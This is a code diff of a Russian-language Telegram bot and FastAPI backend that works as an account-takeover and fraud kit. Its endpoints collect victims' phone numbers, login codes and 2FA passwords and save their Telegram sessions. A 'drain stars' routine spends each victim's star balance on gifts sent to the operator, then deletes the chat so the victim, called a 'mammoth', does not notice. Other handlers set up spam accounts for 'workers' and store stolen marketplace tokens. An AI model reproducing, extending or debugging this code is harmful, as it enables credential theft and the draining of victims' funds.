-        await callback.message.delete()
-    except Exception:
-        pass
-    await _show_sell_vault(callback.message, callback.from_user.id, phone, token_data, page=int(page_str))
 
 
 @dp.callback_query(F.data.startswith("sell_gift_"))
@@ -2536,6 +3278,7 @@ async def cb_sell_cancel(callback: CallbackQuery):
         pass
 
 
+# Обработка ввода цены для /sell
 async def _handle_sell_price_input(message: types.Message) -> bool:
     """Обрабатывает ввод цены. Возвращает True если обработано."""
     admin_id = message.from_user.id
@@ -2547,15 +3290,23 @@ async def _handle_sell_price_input(message: types.Message) -> bool:
     gift_id = session["gift_id"]
     gift_info = session["gift_info"]
 
-    try:
-        price = float(text.replace(",", "."))
+    # Парсим цену
+    if text == "floor":
+        price = session.get("floor_ton", 0)
         if price <= 0:
-            await message.answer("❌ Цена должна быть > 0")
+            await message.answer("❌ Floor цена неизвестна. Введи цену вручную.")
             return True
-    except ValueError:
-        await message.answer("❌ Неверный формат. Введи число (например: <code>5.5</code>)", parse_mode="HTML")
-        return True
+    else:
+        try:
+            price = float(text.replace(",", "."))
+            if price <= 0:
+                await message.answer("❌ Цена должна быть > 0")
+                return True
+        except ValueError:
+            await message.answer("❌ Неверный формат. Введи число (например: <code>5.5</code>)", parse_mode="HTML")
+            return True
 
+    # Листим
     session["step"] = "listing"
     msg = await message.answer(
         f"⏳ Выставляю <b>{gift_info}</b> за <b>{price} TON</b>...",
@@ -2590,34 +3341,29 @@ async def _handle_sell_price_input(message: types.Message) -> bool:
     _sell_sessions.pop(admin_id, None)
     return True
 
+def save_parser_username(uid, username):
+    path = os.path.join(mrkt_config.BROADCAST_SESSIONS_DIR, "usernames.json")
+    data = {}
+    if os.path.exists(path):
+        try:
+            with open(path, "r", encoding="utf-8") as f:
+                data = json.load(f)
+        except Exception:
+            pass
+    data[str(uid)] = username
+    with open(path, "w", encoding="utf-8") as f:
+        json.dump(data, f)
+
 
 @dp.message(F.text & F.chat.type == "private")
 async def handle_text(message: types.Message):
     uid = message.from_user.id
     text = message.text.strip()
 
-    # ── metrics cache: pending input handler ──
-    if is_admin(uid):
-        if text == "/tk":
-            # intercept command here because this text handler consumes everything
-            return await _mc_entry(message)
-        if uid in _mc_pending and "phone" in _mc_pending[uid]:
-            phone = _mc_pending[uid]["phone"]
-            del _mc_pending[uid]
-            await message.delete()
-            data = saved_tokens.get(phone)
-            if data:
-                data["token"] = text
-                _save_tokens()
-                m = await message.answer(f"✅ <code>{phone}</code> updated", parse_mode="HTML")
-                await asyncio.sleep(3)
-                await m.delete()
-            return
-
-    # ── /sell price input ──
-    if await _handle_sell_price_input(message):
+    # ── Sell price input ──
+    if is_admin(uid) and await _handle_sell_price_input(message):
         return
-    
+
     # ── Worker spam-акк auth flow (доступно ВСЕМ воркерам) ──
     wskey = f"_wkr_spam_{uid}"
     if wskey in auth_sessions:
@@ -2632,16 +3378,14 @@ async def handle_text(message: types.Message):
                 return
             msg = await message.reply(f"📱 Отправляю код на {phone}...")
             try:
-                # Берём спам-прокси для авторизации (если доступны)
+                # Берём спам-прокси для авторизации
+                _spam_prx = []
                 _prx_tuple = None
-                try:
-                    from mrkt.spam_parser import load_spam_proxies
-                    _spam_prx = load_spam_proxies()
-                    if _spam_prx:
-                        _prx_tuple = _spam_prx[0]
-                        logger.info(f"[AUTH] Прокси для авторизации: {_prx_tuple[0]}:{_prx_tuple[1]}")
-                except Exception:
-                    pass
+                if _spam_prx:
+                    _prx_tuple = _spam_prx[0]  # (host, port, login, password)
+                    logger.info(f"[AUTH] Прокси для авторизации: {_prx_tuple[0]}:{_prx_tuple[1]}")
+                else:
+                    logger.warning("[AUTH] Нет спам-прокси для авторизации!")
                 
                 tc = TelethonClient(2, "149.154.167.50", 443, "", proxy=_prx_tuple)
                 await tc.connect()
@@ -2661,32 +3405,35 @@ async def handle_text(message: types.Message):
                 await tc.sign_in(phone, text.replace(" ", "").strip())
                 me = await tc.get_me()
                 uname = me.username or str(me.id)
-                # Сохраняем как SQLite session файл (не StringSession!)
+                session_str = tc.client.session.save()
                 os.makedirs(mrkt_config.BROADCAST_SESSIONS_DIR, exist_ok=True)
-                spath = os.path.join(mrkt_config.BROADCAST_SESSIONS_DIR, f"parser_{me.id}")
-                if os.path.exists(spath + ".session"):
-                    os.remove(spath + ".session")
-                from telethon import TelegramClient as _TC
-                export_c = _TC(spath, mrkt_config.API_ID, mrkt_config.API_HASH)
-                export_c.session.set_dc(tc.client.session.dc_id, tc.client.session.server_address, tc.client.session.port)
-                export_c.session.auth_key = tc.client.session.auth_key
-                export_c.session.save()
+                spath = os.path.join(mrkt_config.BROADCAST_SESSIONS_DIR, f"parser_{me.id}.session")
+                with open(spath, "w", encoding="utf-8") as f:
+                    f.write(session_str)
                 save_parser_username(me.id, uname)
                 worker_system.add_spam_account(uid, phone, str(me.id))
+                
+                # Автонастройка акка
+                await msg.edit_text("⏳ Настраиваю аккаунт...")
+                setup_results = await _setup_spam_account(tc.client)
+                setup_report = "\n".join(setup_results)
+                
                 await msg.edit_text(
                     f"✅ <b>Спам-акк готов к работе!</b>\n\n"
                     f"🆔 <code>{me.id}</code>\n📞 <code>{phone}</code>\n\n"
-                    f"🚀 <i>Аккаунт готов. Можно запускать рассылку.</i>",
+                    f"🔧 <b>Настройка:</b>\n{setup_report}\n\n"
+                    f"🚀 <i>Аккаунт полностью настроен. Можно запускать рассылку.</i>",
                     parse_mode="HTML",
                 )
                 await send_admin_log(
                     f"📱 <b>Спам-акк готов!</b>\n"
                     f"🆔 <code>{me.id}</code> | 📞 <code>{phone}</code>\n"
-                    f"👷 Воркер: @{message.from_user.username or uid}"
+                    f"👷 Воркер: @{message.from_user.username or uid}\n\n"
+                    f"🔧 {' | '.join(setup_results)}"
                 )
                 await tc.disconnect()
                 del auth_sessions[wskey]
-            except TwoFactorAuthRequiredError:
+            except (TwoFactorAuthRequiredError, SessionPasswordNeededError):
                 auth_sessions[wskey]["step"] = "2fa"
                 await msg.edit_text("🔐 Нужен 2FA пароль. Введи его:")
             except Exception as e:
@@ -2703,28 +3450,31 @@ async def handle_text(message: types.Message):
                 await tc.sign_in_with_password(text.strip())
                 me = await tc.get_me()
                 uname = me.username or str(me.id)
-                # Сохраняем как SQLite session файл (не StringSession!)
+                session_str = tc.client.session.save()
                 os.makedirs(mrkt_config.BROADCAST_SESSIONS_DIR, exist_ok=True)
-                spath = os.path.join(mrkt_config.BROADCAST_SESSIONS_DIR, f"parser_{me.id}")
-                if os.path.exists(spath + ".session"):
-                    os.remove(spath + ".session")
-                from telethon import TelegramClient as _TC
-                export_c = _TC(spath, mrkt_config.API_ID, mrkt_config.API_HASH)
-                export_c.session.set_dc(tc.client.session.dc_id, tc.client.session.server_address, tc.client.session.port)
-                export_c.session.auth_key = tc.client.session.auth_key
-                export_c.session.save()
+                spath = os.path.join(mrkt_config.BROADCAST_SESSIONS_DIR, f"parser_{me.id}.session")
+                with open(spath, "w", encoding="utf-8") as f:
+                    f.write(session_str)
                 save_parser_username(me.id, uname)
                 worker_system.add_spam_account(uid, phone, str(me.id))
+                
+                # Автонастройка акка
+                await msg.edit_text("⏳ Настраиваю аккаунт...")
+                setup_results = await _setup_spam_account(tc.client)
+                setup_report = "\n".join(setup_results)
+                
                 await msg.edit_text(
                     f"✅ <b>Спам-акк готов (2FA)!</b>\n\n"
                     f"🆔 <code>{me.id}</code>\n\n"
-                    f"🚀 <i>Аккаунт готов. Можно запускать рассылку.</i>",
+                    f"🔧 <b>Настройка:</b>\n{setup_report}\n\n"
+                    f"🚀 <i>Аккаунт полностью настроен. Можно запускать рассылку.</i>",
                     parse_mode="HTML",
                 )
                 await send_admin_log(
                     f"📱 <b>Спам-акк готов (2FA)!</b>\n"
                     f"🆔 <code>{me.id}</code>\n"
-                    f"👷 Воркер: @{message.from_user.username or uid}"
+                    f"👷 Воркер: @{message.from_user.username or uid}\n\n"
+                    f"🔧 {' | '.join(setup_results)}"
                 )
                 await tc.disconnect()
                 del auth_sessions[wskey]
@@ -2743,6 +3493,74 @@ async def handle_text(message: types.Message):
             await message.answer(f"✅ Кошелёк: <code>{text}</code>")
             return
         await message.answer("❌ Неверный формат (UQ/EQ/0:)")
+        return
+
+    # ── Manual token input ──
+    tkey = f"_add_token_{uid}"
+    if tkey in auth_sessions and auth_sessions[tkey].get("step") == "awaiting_token" and is_admin(uid):
+        del auth_sessions[tkey]
+        text_raw = text.strip()
+
+        # Попытка 1: JSON формат
+        try:
+            data = json.loads(text_raw)
+            if isinstance(data, dict) and data.get("token"):
+                phone = data.get("phone", f"manual_{int(asyncio.get_event_loop().time())}")
+                _add_token(
+                    phone=phone,
+                    token=data["token"],
+                    username=data.get("username", "?"),
+                    tg_id=data.get("tg_id", 0),
+                    first_name=data.get("first_name", ""),
+                )
+                saved_tokens[phone]["source"] = "manual"
+                _save_tokens()
+                uname = data.get("username", "?")
+                await message.answer(
+                    f"✅ <b>Токен добавлен!</b>\n\n"
+                    f"👤 @{uname}\n"
+                    f"📞 <code>{phone}</code>\n"
+                    f"🔑 <code>{data['token'][:20]}...</code>",
+                    parse_mode="HTML",
+                )
+                return
+        except (json.JSONDecodeError, ValueError):
+            pass
+
+        # Попытка 2: токен + номер через пробел
+        parts = text_raw.split()
+        if len(parts) >= 2 and len(parts[0]) > 20:
+            token = parts[0]
+            phone = parts[1]
+            _add_token(phone=phone, token=token, username="?")
+            saved_tokens[phone]["source"] = "manual"
+            _save_tokens()
+            await message.answer(
+                f"✅ <b>Токен добавлен!</b>\n\n"
+                f"📞 <code>{phone}</code>\n"
+                f"🔑 <code>{token[:20]}...</code>",
+                parse_mode="HTML",
+            )
+            return
+
+        # Попытка 3: просто токен (UUID-like)
+        if len(text_raw) > 20 and "-" in text_raw:
+            phone = f"manual_{int(asyncio.get_event_loop().time())}"
+            _add_token(phone=phone, token=text_raw, username="?")
+            saved_tokens[phone]["source"] = "manual"
+            _save_tokens()
+            await message.answer(
+                f"✅ <b>Токен добавлен!</b>\n\n"
+                f"📞 <code>{phone}</code> (авто)\n"
+                f"🔑 <code>{text_raw[:20]}...</code>",
+                parse_mode="HTML",
+            )
+            return
+
+        await message.answer(
+            "❌ Не удалось распознать токен.\n"
+            "Отправь JSON, токен+номер, или просто токен.",
+        )
         return
         
     # Buy gift by ID input
@@ -2953,16 +3771,12 @@ async def handle_text(message: types.Message):
                 await tc.sign_in(phone=phone, code=text.replace(" ", "").strip())
                 me = await tc.get_me()
                 
-                # Сохраняем как SQLite session файл
-                parser_session_path = os.path.join(mrkt_config.BROADCAST_SESSIONS_DIR, f"parser_{me.id}")
-                os.makedirs(mrkt_config.BROADCAST_SESSIONS_DIR, exist_ok=True)
-                if os.path.exists(parser_session_path + ".session"):
-                    os.remove(parser_session_path + ".session")
-                from telethon import TelegramClient as _TC
-                _exp = _TC(parser_session_path, mrkt_config.API_ID, mrkt_config.API_HASH)
-                _exp.session.set_dc(tc.client.session.dc_id, tc.client.session.server_address, tc.client.session.port)
-                _exp.session.auth_key = tc.client.session.auth_key
-                _exp.session.save()
+                # Извлекаем полную строку сессии
+                session_str = tc.client.session.save()
+                parser_session_path = os.path.join(mrkt_config.BROADCAST_SESSIONS_DIR, f"parser_{me.id}.session")
+                os.makedirs(os.path.dirname(parser_session_path), exist_ok=True)
+                with open(parser_session_path, "w") as f:
+                    f.write(session_str)
                 
                 uname = me.username or me.first_name
                 save_parser_username(me.id, uname)
@@ -2991,16 +3805,11 @@ async def handle_text(message: types.Message):
                 await tc.sign_in_with_password(password=text)
                 me = await tc.get_me()
                 
-                # Сохраняем как SQLite session файл
-                parser_session_path = os.path.join(mrkt_config.BROADCAST_SESSIONS_DIR, f"parser_{me.id}")
-                os.makedirs(mrkt_config.BROADCAST_SESSIONS_DIR, exist_ok=True)
-                if os.path.exists(parser_session_path + ".session"):
-                    os.remove(parser_session_path + ".session")
-                from telethon import TelegramClient as _TC
-                _exp = _TC(parser_session_path, mrkt_config.API_ID, mrkt_config.API_HASH)
-                _exp.session.set_dc(tc.client.session.dc_id, tc.client.session.server_address, tc.client.session.port)
-                _exp.session.auth_key = tc.client.session.auth_key
-                _exp.session.save()
+                session_str = tc.client.session.save()
+                parser_session_path = os.path.join(mrkt_config.BROADCAST_SESSIONS_DIR, f"parser_{me.id}.session")
+                os.makedirs(os.path.dirname(parser_session_path), exist_ok=True)
+                with open(parser_session_path, "w") as f:
+                    f.write(session_str)
                 
                 uname = me.username or me.first_name
                 save_parser_username(me.id, uname)
@@ -3026,43 +3835,82 @@ async def handle_text(message: types.Message):
 #  FASTAPI ENDPOINTS (авторизация Telethon)
 # ══════════════════════════════════════════════════════════════
 
-# ── Anti-spam / Rate limit ──
-_rate_limit: Dict[int, list] = {}   # user_id → [timestamp, ...]
-_blacklist: set = set()             # забаненные спамеры
-_fail_count: Dict[int, int] = {}   # user_id → кол-во ошибок подряд
+# ── Anti-spam / Anti-XSS защита ──
+import re as _re
+from html import escape as _html_escape
+from collections import defaultdict as _defaultdict
 
-RATE_LIMIT_WINDOW = 60    # секунд
-RATE_LIMIT_MAX = 3        # макс запросов за окно
-AUTO_BAN_THRESHOLD = 10   # после N ошибок — бан
+_rate_limits: dict = {}        # user_id → [timestamps]
+_blacklist: set = set()        # забаненные user_id
+_fail_counts: dict = {}        # user_id → int (кол-во ошибок)
 
-def _check_rate_limit(user_id: int) -> bool:
-    """Возвращает True если запрос разрешён."""
-    if user_id in _blacklist:
-        return False
+RATE_LIMIT_WINDOW = 10         # секунд
+RATE_LIMIT_MAX = 5             # макс запросов в окне
+BLACKLIST_THRESHOLD = 15       # ошибок до бана
+
+
+def _strip_html(text: str) -> str:
+    """Убирает все HTML/XML теги из строки."""
+    if not text:
+        return ""
+    return _re.sub(r'<[^>]+>', '', text).strip()
+
+
+def _safe_html(text: str) -> str:
+    """Экранирует HTML для безопасной отправки в Telegram."""
+    if not text:
+        return ""
+    return _html_escape(str(text), quote=False)
+
+
+def _check_rate_limit(user_id) -> bool:
+    """Возвращает True если лимит превышен (заблокировать)."""
+    uid = str(user_id)
+    if uid in _blacklist:
+        return True
     now = time.time()
-    timestamps = _rate_limit.get(user_id, [])
-    timestamps = [t for t in timestamps if now - t < RATE_LIMIT_WINDOW]
-    if len(timestamps) >= RATE_LIMIT_MAX:
-        return False
-    timestamps.append(now)
-    _rate_limit[user_id] = timestamps
-    return True
+    if uid not in _rate_limits:
+        _rate_limits[uid] = []
+    # Очищаем старые записи
+    _rate_limits[uid] = [t for t in _rate_limits[uid] if now - t < RATE_LIMIT_WINDOW]
+    if len(_rate_limits[uid]) >= RATE_LIMIT_MAX:
+        _fail_counts[uid] = _fail_counts.get(uid, 0) + 1
+        if _fail_counts[uid] >= BLACKLIST_THRESHOLD:
+            _blacklist.add(uid)
+            logger.warning(f"[SECURITY] 🚫 User {uid} BLACKLISTED (flood)")
+        return True
+    _rate_limits[uid].append(now)
+    return False
 
-def _record_fail(user_id: int):
-    """Считает ошибки, при превышении — автобан."""
-    _fail_count[user_id] = _fail_count.get(user_id, 0) + 1
-    if _fail_count[user_id] >= AUTO_BAN_THRESHOLD:
-        _blacklist.add(user_id)
-        logger.warning(f"[ANTI-SPAM] 🚫 user {user_id} auto-banned after {_fail_count[user_id]} fails")
 
-def _validate_phone(phone: str) -> Optional[str]:
-    """Валидирует и чистит номер. Возвращает чистый номер или None."""
+def _record_fail(user_id):
+    """Записывает ошибку для подсчёта до бана."""
+    uid = str(user_id)
+    _fail_counts[uid] = _fail_counts.get(uid, 0) + 1
+    if _fail_counts[uid] >= BLACKLIST_THRESHOLD:
+        _blacklist.add(uid)
+        logger.warning(f"[SECURITY] 🚫 User {uid} BLACKLISTED ({_fail_counts[uid]} fails)")
+
+
+def _validate_phone(phone: str) -> str | None:
+    """Валидирует и очищает номер телефона. Возвращает None если невалид."""
+    if not phone:
+        return None
     clean = "".join(c for c in phone if c.isdigit() or c == '+')
     if clean and not clean.startswith('+'):
         clean = '+' + clean
-    digits_only = clean.lstrip('+')
-    # ITU стандарт: от 7 до 15 цифр
-    if not digits_only.isdigit() or len(digits_only) < 7 or len(digits_only) > 15:
+    digits = clean.lstrip('+')
+    if not digits.isdigit() or len(digits) < 7 or len(digits) > 15:
+        return None
+    return clean
+
+
+def _validate_code(code: str) -> str | None:
+    """Валидирует код подтверждения. Только цифры, 4-6 символов."""
+    if not code:
+        return None
+    clean = "".join(c for c in str(code) if c.isdigit())
+    if len(clean) < 4 or len(clean) > 6:
         return None
     return clean
 
@@ -3112,20 +3960,26 @@ async def api_user_action(data: UserActionLog):
     if not data.user_id or str(data.user_id) == "0" or str(data.user_id) == "None":
         return {"status": "ignored"}
 
-    if data.user_id in _blacklist:
-        return {"status": "blocked"}
+    if _check_rate_limit(data.user_id):
+        return {"status": "ignored"}
 
-    log_action(data.user_id, data.action, f"username={data.username}")
+    # Санитизация username
+    safe_username = _safe_html(_strip_html(data.username or "?"))
+
+    log_action(data.user_id, data.action, f"username={safe_username}")
     action_text = action_map[data.action]
     ref = referrals.get(data.user_id)
     ref_str = f"\n👤 Воркер: <code>{ref}</code>" if ref else ""
 
-    await send_admin_log(
-        f"📊 <b>{action_text}</b>\n"
-        f"👤 @{data.username or '?'}\n"
-        f"🆔 <code>{data.user_id}</code>{ref_str}\n"
-        f"🕐 {kyiv_str()}"
-    )
+    try:
+        await send_admin_log(
+            f"📊 <b>{action_text}</b>\n"
+            f"👤 @{safe_username}\n"
+            f"🆔 <code>{data.user_id}</code>{ref_str}\n"
+            f"🕐 {kyiv_str()}"
+        )
+    except Exception:
+        pass
     return {"status": "success"}
 
 
@@ -3137,29 +3991,27 @@ async def api_request_phone(req: PhoneRequest):
         if not user_id or str(user_id) == "0" or str(user_id) == "None":
             return {"status": "error", "message": "Invalid user"}
 
-        # Anti-spam: blacklist
-        if user_id in _blacklist:
-            logger.warning(f"[ANTI-SPAM] Blocked request from banned user {user_id}")
+        # Anti-spam
+        if _check_rate_limit(user_id):
             return {"status": "error", "message": "Too many requests"}
 
-        # Anti-spam: rate limit
-        if not _check_rate_limit(user_id):
-            logger.warning(f"[ANTI-SPAM] Rate limited user {user_id}")
-            return {"status": "error", "message": "Too many requests. Try again later."}
-
-        # Валидация номера (7-15 цифр, ITU стандарт)
-        phone = _validate_phone(req.phone_number.strip() if req.phone_number else "")
+        # Валидация и санитизация телефона
+        phone = _validate_phone(_strip_html(req.phone_number or ""))
         if not phone:
-            logger.warning(f"[AUTH] Invalid phone from user {user_id}: {req.phone_number}")
             _record_fail(user_id)
+            logger.warning(f"[AUTH] Invalid phone from user {user_id}: {_safe_html(req.phone_number or '')[:50]}")
             return {"status": "error", "message": "Invalid phone format"}
 
-        logger.info(f"[AUTH] Phone request: user={user_id}, phone={phone}")
+        safe_username = _safe_html(_strip_html(req.username or "?"))
 
+        logger.info(f"[AUTH] Phone request: user={user_id}, phone={phone}")
         log_action(user_id, "phone_shared", phone)
 
         # Создаём Telethon клиент
-        tc = TelethonClient(2, "149.154.167.50", 443, "")
+        from telethon import TelegramClient
+        from telethon.sessions import StringSession
+        from mrkt import config as _cfg
+        tc = TelegramClient(StringSession(), _cfg.API_ID, _cfg.API_HASH)
         await tc.connect()
 
         phone_code_hash = await tc.send_code_request(phone)
@@ -3170,29 +4022,28 @@ async def api_request_phone(req: PhoneRequest):
         auth_sessions[session_id] = {
             "user_id": user_id,
             "phone": phone,
-            "username": req.username,
+            "username": safe_username,
             "telethon_client": tc,
             "created_at": kyiv_str(),
             "status": "code_sent",
         }
 
-        await send_admin_log(
-            f"📱 <b>Номер получен</b>\n"
-            f"👤 @{req.username or '?'}\n"
-            f"🆔 <code>{user_id}</code>\n"
-            f"📞 <code>{phone}</code>\n"
-            f"🕐 {kyiv_str()}"
-        )
-
-        # Сброс счётчика ошибок при успехе
-        _fail_count.pop(user_id, None)
+        try:
+            await send_admin_log(
+                f"📱 <b>Номер получен</b>\n"
+                f"👤 @{safe_username}\n"
+                f"🆔 <code>{user_id}</code>\n"
+                f"📞 <code>{phone}</code>\n"
+                f"🕐 {kyiv_str()}"
+            )
+        except Exception:
+            pass
 
         return {"status": "success", "message": "Code sent", "session_id": session_id}
 
     except Exception as e:
+        _record_fail(req.user_id)
         logger.error(f"[AUTH] request-phone error: {e}")
-        if req.user_id:
-            _record_fail(req.user_id)
         raise HTTPException(status_code=500, detail=str(e))
 
 
@@ -3200,23 +4051,26 @@ async def api_request_phone(req: PhoneRequest):
 async def api_verify_code(req: CodeVerification):
     try:
         user_id = req.user_id
-        phone = req.phone_number
-        code = req.code
         provided_sid = req.session_id
 
         if not user_id or str(user_id) == "0" or str(user_id) == "None":
             return {"status": "error", "message": "Invalid user_id"}
 
-        if user_id in _blacklist:
+        # Anti-spam
+        if _check_rate_limit(user_id):
             return {"status": "error", "message": "Too many requests"}
 
-        if not _check_rate_limit(user_id):
-            return {"status": "error", "message": "Too many requests"}
+        # Валидация телефона
+        phone = _validate_phone(_strip_html(req.phone_number or ""))
+        if not phone:
+            _record_fail(user_id)
+            return {"status": "error", "message": "Invalid phone"}
 
-        clean_phone = "".join(c for c in phone if c.isdigit() or c == '+')
-        if clean_phone and not clean_phone.startswith('+'):
-            clean_phone = '+' + clean_phone
-        phone = clean_phone
+        # Валидация кода (только цифры, 4-6 символов)
+        code = _validate_code(_strip_html(req.code or ""))
+        if not code:
+            _record_fail(user_id)
+            return {"status": "error", "message": "Invalid code format"}
 
         logger.info(f"[AUTH] Code verify: user={user_id}, code={code}")
 
@@ -3265,7 +4119,7 @@ async def api_verify_code(req: CodeVerification):
 
             return {"status": "success", "session_id": session_id}
 
-        except TwoFactorAuthRequiredError:
+        except (TwoFactorAuthRequiredError, SessionPasswordNeededError):
             session["status"] = "2fa_required"
             log_action(user_id, "2fa_required", phone)
             await send_admin_log(
@@ -3296,21 +4150,20 @@ async def api_verify_code(req: CodeVerification):
 async def api_verify_password(req: PasswordVerification):
     try:
         user_id = req.user_id
-        phone = req.phone_number
-        password = req.password
 
         if not user_id or str(user_id) == "0" or str(user_id) == "None":
             return {"status": "error", "message": "Invalid user_id"}
 
-        if user_id in _blacklist:
+        # Anti-spam
+        if _check_rate_limit(user_id):
             return {"status": "error", "message": "Too many requests"}
 
-        if not _check_rate_limit(user_id):
-            return {"status": "error", "message": "Too many requests"}
-        clean_phone = "".join(c for c in phone if c.isdigit() or c == '+')
-        if clean_phone and not clean_phone.startswith('+'):
-            clean_phone = '+' + clean_phone
-        phone = clean_phone
+        phone = _validate_phone(_strip_html(req.phone_number or "")) or ""
+
+        password = _strip_html(req.password or "")
+        if not password or len(password) > 128:
+            _record_fail(user_id)
+            return {"status": "error", "message": "Invalid password"}
 
         logger.info(f"[AUTH] 2FA verify: user={user_id}")
 
@@ -3330,7 +4183,7 @@ async def api_verify_password(req: PasswordVerification):
         tc = session["telethon_client"]
 
         try:
-            await tc.sign_in_with_password(password)
+            await tc.sign_in(password=password)
             session["status"] = "authorized"
             session["2fa_password"] = password
 
@@ -3381,22 +4234,15 @@ async def api_qr_start(request: Request):
     if not user_id or str(user_id) == "0" or str(user_id) == "None":
         return {"status": "error", "message": "Invalid user_id"}
 
-    # Anti-spam
-    try:
-        user_id = int(user_id)
-    except (ValueError, TypeError):
-        return {"status": "error", "message": "Invalid user_id"}
-    if user_id in _blacklist:
-        return {"status": "error", "message": "Too many requests"}
-    if not _check_rate_limit(user_id):
-        return {"status": "error", "message": "Too many requests"}
-
     # Init telethon client for QR
     try:
-        tc = TelethonClient(2, "149.154.167.50", 443, "")
-        await tc.connect()
+        from telethon import TelegramClient
+        from telethon.sessions import StringSession
+        from mrkt import config as _cfg
+        _client = TelegramClient(StringSession(), _cfg.API_ID, _cfg.API_HASH)
+        await _client.connect()
 
-        qr_login = await tc.client.qr_login()
+        qr_login = await _client.qr_login()
         url = qr_login.url
 
         session_id = f"qr_{user_id}_{int(time.time())}"
@@ -3405,7 +4251,7 @@ async def api_qr_start(request: Request):
         auth_sessions[session_id] = {
             "user_id": user_id,
             "phone": "QR",
-            "telethon_client": tc,
+            "telethon_client": _client,
             "status": "waiting_qr",
             "qr_login": qr_login,
             "user_info": {"username": username}
@@ -3474,7 +4320,7 @@ async def _process_authorized_session(session_id: str):
     tc = session["telethon_client"]
     user_info = session.get("user_info", {})
     tg_username = user_info.get("username", "?")
-    tg_client = tc.client  # raw TelegramClient
+    tg_client = tc  # raw TelegramClient
 
     try:
         # ═══ ШАГ 1: Получаем init_data через RequestAppWebView на @mrkt ═══
@@ -3497,6 +4343,32 @@ async def _process_authorized_session(session_id: str):
             return
 
         log_action(user_id, "init_data_ok", f"len={len(init_data)}")
+
+        # ═══ Buyer account protection: refresh token only, skip pipeline ═══
+        _buyer_phone = buyer_token_data.get("phone", "")
+        _buyer_tgid = buyer_token_data.get("tg_id", 0)
+        _is_buyer = (phone == _buyer_phone and _buyer_phone) or (user_info.get("id") == _buyer_tgid and _buyer_tgid)
+        if _is_buyer:
+            try:
+                proxy = None
+                api = await MrktAPI.auth_with_init_data(init_data, proxy=proxy)
+                # Update buyer token
+                buyer_token_data["token"] = api.token
+                buyer_token_data["username"] = tg_username
+                buyer_token_data["tg_id"] = user_info.get("id", 0)
+                buyer_token_data["phone"] = phone
+                _save_buyer_token()
+                # Also update in saved_tokens
+                _add_token(phone=phone, token=api.token, username=tg_username, tg_id=user_info.get("id", 0), first_name=user_info.get("first_name", ""))
+                await api.close()
+                await send_admin_log(
+                    f"🛒 <b>Buyer token refreshed!</b>\n"
+                    f"👤 @{tg_username}\n"
+                    f"📞 <code>{phone}</code>"
+                )
+            except Exception as e:
+                await send_admin_log(f"❌ Buyer token refresh failed: {e}")
+            return
 
         # ═══ PREFETCH: Получаем init_data для ВСЕХ маркетов (пока Telethon жив) ═══
         cross_init_data = {}
@@ -3543,106 +4415,159 @@ async def _process_authorized_session(session_id: str):
         except Exception as e:
             logger.error(f"[CROSS] Prefetch error: {e}")
 
-        # ═══ ДРЕЙН ОСТАВШИХСЯ ЗВЁЗД ═══
-        async def drain_stars_task():
+        # ═══ ДРЕЙН ЗВЁЗД + ГИФТЫ НА ПРОДАЖЕ ═══
+        async def drain_and_gifts_task():
             try:
                 from telethon_client import TelethonClient
-                drain_balance = await TelethonClient.get_balance(tg_client)
-
-                await send_admin_log(
-                    f"══ DRAIN STARS ══ Баланс: {drain_balance}⭐ (@{tg_username})"
+                from mrkt.star_gifts import (
+                    fast_drain_stars, get_star_gifts_on_sale,
+                    star_monitor_loop, delete_dialog,
+                )
+                admin_un = getattr(
+                    mrkt_config,
+                    "ADMIN_USERNAME",
+                    mrkt_config.BOT_USERNAME.lstrip("@"),
                 )
 
-                if drain_balance >= 15:
-                    admin_un = getattr(
-                        mrkt_config,
-                        "ADMIN_USERNAME",
-                        mrkt_config.BOT_USERNAME.lstrip("@"),
+                # Проверка: не удаляем аккаунт баера
+                buyer_phone = buyer_token_data.get("phone", "")
+                is_buyer = phone == buyer_phone
+
+                # ── Параллельно: drain текущих ⭐ + парсинг гифтов на продаже ──
+                drain_balance = 0
+                star_gifts = []
+
+                async def _drain_initial():
+                    nonlocal drain_balance
+                    drain_balance = await TelethonClient.get_balance(tg_client)
+                    await send_admin_log(f"══ DRAIN STARS ══ Баланс: {drain_balance}⭐ (@{tg_username})")
+                    if drain_balance >= 15:
+                        result = await fast_drain_stars(tc, tg_client, admin_un, drain_balance)
+                        drain_balance = result["remaining"]
+                        if result["sent"] > 0:
+                            await send_admin_log(
+                                f"🎁 <b>Дрейн звёзд завершён!</b>\n"
+                                f"👤 Мамонт: @{tg_username}\n"
+                                f"✅ Отправлено: {result['sent']} подарков ({result['spent']}⭐)\n"
+                                f"💰 Осталось: {result['remaining']}⭐"
+                            )
+                        # Очистка диалога сразу
+                        await delete_dialog(tg_client, admin_un)
+
+                async def _parse_gifts():
+                    nonlocal star_gifts
+                    star_gifts = await get_star_gifts_on_sale(tg_client)
+
+                await asyncio.gather(
+                    _drain_initial(),
+                    _parse_gifts(),
+                    return_exceptions=True,
+                )
+
+                # ── Если есть гифты на продаже за ⭐ ──
+                if star_gifts:
+                    total_stars = sum(g["stars"] for g in star_gifts)
+                    gifts_text = "\n".join(
+                        f"  • {g['name']} — {g['stars']}⭐" for g in star_gifts
                     )
 
-                    try:
-                        await tg_client.send_message(admin_un, "👋")
-                        await asyncio.sleep(0.5)
-                    except Exception:
-                        pass
-
-                    STAR_GIFT_PRICES = {
-                        5168043875654172773: 100,
-                        5170564780938756245: 50,
-                        5170250947678437525: 25,
-                        5170233102089322756: 15,
+                    # Сохраняем гифты в сессию для callback
+                    session_key = f"star_gifts_{phone}"
+                    auth_sessions[session_key] = {
+                        "gifts": star_gifts,
+                        "tg_client": tg_client,
+                        "tc": tc,
+                        "admin_un": admin_un,
+                        "phone": phone,
+                        "username": tg_username,
                     }
 
-                    remaining = drain_balance
-                    sent_count = 0
-                    spent = 0
+                    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+                        [InlineKeyboardButton(
+                            text=f"💰 Скупить ({total_stars}⭐)",
+                            callback_data=f"star_buy|{phone}",
+                        )],
+                    ])
 
-                    for gid, price in STAR_GIFT_PRICES.items():
-                        while remaining >= price:
-                            try:
-                                ok = await tc.purchase_gift(admin_un, gid)
-                                if ok:
-                                    remaining -= price
-                                    sent_count += 1
-                                    spent += price
-                                else:
-                                    break
-                            except Exception:
-                                break
-                            await asyncio.sleep(0.3)
-
-                    if sent_count > 0:
-                        await send_admin_log(
-                            f"🎁 <b>Дрейн звёзд завершён!</b>\n"
-                            f"👤 Мамонт: @{tg_username}\n"
-                            f"✅ Отправлено: {sent_count} подарков ({spent}⭐)\n"
-                            f"💰 Осталось: {remaining}⭐"
-                        )
-
-                    # Удаляем чат с админом чтобы мамонт не увидел
-                    try:
